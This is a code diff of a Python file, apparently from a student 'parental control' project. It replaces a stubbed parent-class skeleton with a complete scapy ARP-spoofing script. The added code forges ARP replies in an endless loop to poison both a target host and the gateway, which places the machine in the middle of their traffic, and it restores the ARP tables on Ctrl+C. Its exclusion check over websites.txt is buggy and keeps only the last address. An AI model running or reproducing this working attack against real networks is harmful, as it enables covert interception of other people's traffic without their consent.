@@ -1,87 +1,53 @@
-import socket
-import json
+import scapy.all as scapy
 import time
-import arp
-import spoofing
-import html_sql_client
-from scapy.all import sniff
-import multiprocessing
-from multiprocessing import Queue
-import threading
-
-
-
-class Parent:
-    def __init__(self, username, password):
-        self.username = username
-        self.password = password
-        self.connected_children = {}
-
-    def connect_to_server(self):
-        # Implement server connection logic
-        pass
-
-    def login(self):
-        # Implement login logic
-        lient_thread = threading.Thread(target=html_sql_client.login)
-        lient_thread.start()
-
-    def add_child(self, child_name):
-        # Implement adding child logic
-        pass
-
-    def show_connected_children(self):
-        # Display connected children
-        pass
-
-    def parental_control_menu(self, child_name):
-        # Implement parental control menu logic
-        pass
-
-    def remind_to_take_break(self, child_name):
-        print(f"\nReminder for {child_name}: It's time for an eye break from the computer.")
-        print("Leave your computer and come back in about five minutes.")
-        time.sleep(300)  # Wait for 5 minutes
-
-    def set_screen_time_limits(self, child_name):
-        # Implement screen time limits logic
-        pass
-
-    def restrict_websites(self, child_name):
-        # Implement website restriction logic
-        pass
-
-    def configure_arp_spoofing(self):
-        q = Queue()
-        client_thread = multiprocessing.Process(target=arp1, args=())
-        client_thread2 = multiprocessing.Process(target=spoof1, args=(q,))
-        client_thread.start()
-        client_thread2.start()
-        print(str(q.get()))
-
-
-
-    def view_child_screen_time(self, child_name):
-        # Implement screen time view logic
-        pass
-
-    def take_control_of_child_screen(self, child_name):
-        # Implement taking control of child's screen logic (Optional)
-        pass
-
-
-def arp1():
-    arp.main()
-
-def spoof1(q):
-    spoofing.main(q)
-    print(str(q))
-
-
-if __name__ == "__main__":
-    par = Parent("ma", "ta")
-    par.configure_arp_spoofing()
-    par.login()
-
-
-# Example Usage:
+import argparse
+import socket
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest="target", default="192.168.68.117", help="Target IP")
+    parser.add_argument("-g", "--gateway", dest="gateway", default="192.168.68.1", help="Gateway IP")
+    args = parser.parse_args()
+    return args.target, args.gateway
+# Get target mac address using ip address
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    print(answered_list)  # Add this line to see what answered_list contains
+    return answered_list[0][1].hwsrc if answered_list else None
+# Change mac address in arp table
+def spoof(target_ip, spoof_ip):
+    file = open("websites.txt", "r")
+    for line in file:
+        url = line.split(",")[0]
+        ip_add = socket.gethostbyname(url)
+        exclude_ip = (str(ip_add))
+    if target_ip == exclude_ip:
+        print(f"Skipping forwarding for {exclude_ip}")
+        return
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
+                       psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+# Restore mac address in arp table
+def restore(dest_ip, source_ip):
+    dest_mac = get_mac(dest_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
+                       psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+options = get_arguments()
+sent_packets_count = 0
+try:
+    while True:
+        spoof("192.168.68.117", "192.168.68.1")
+        spoof("192.168.68.1", "192.168.68.117")
+        sent_packets_count += 2
+        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\nCTRL+C pressed .... Reseting ARP tables. Please wait")
+    restore(options.target, options.gateway)
+    restore(options.gateway, options.target)
+    print("\nARP table restored. Quiting")
